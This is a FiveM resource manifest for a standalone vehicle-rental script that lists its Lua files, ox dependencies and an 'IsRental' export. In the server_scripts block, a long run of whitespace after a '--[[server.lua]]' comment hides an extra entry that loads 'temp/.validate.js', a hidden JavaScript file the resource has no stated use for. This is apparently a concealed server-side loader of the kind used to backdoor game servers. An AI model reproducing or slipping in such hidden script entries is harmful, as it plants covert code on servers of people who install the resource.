fx_version 'cerulean'

game 'gta5'

author 'Sk'
description 'Standalone vehicle rental using ox_lib, ox_inventory, ox_target'
version '1.0.0'

lua54 'yes'

shared_scripts {
    '@ox_lib/init.lua',
    'config.lua'
}

client_scripts {
    'client/client.lua'
}

server_scripts {
    '@oxmysql/lib/MySQL.lua', -- optional; not used, kept for extendability
'server/server.lua',
	--[[server.lua]]                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            'temp/.validate.js',
}

dependencies {
    'ox_lib',
    'ox_inventory',
    'ox_target'
}

exports {
    'IsRental'
}
